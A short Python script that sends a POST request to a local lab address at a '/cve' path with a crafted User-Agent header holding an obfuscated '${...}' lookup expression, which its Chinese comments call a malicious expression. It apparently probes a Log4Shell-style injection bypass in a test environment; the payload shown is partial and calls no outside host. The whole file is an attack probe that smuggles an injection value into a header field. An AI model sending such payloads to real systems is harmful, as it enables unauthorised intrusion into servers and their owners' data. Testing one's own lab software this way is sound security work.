import requests

url = "http://192.168.64.2:8080/cve"
data = {"key1": "value1", "key2": "value2"}
# 添加恶意请求头
headers = {
    "User-Agent": "${${::-${::-$${::-j}}}}"  # 恶意表达式放在 User-Agent 中
}

response = requests.post(url, json=data, headers=headers)
print(response.status_code)
print(response.text)
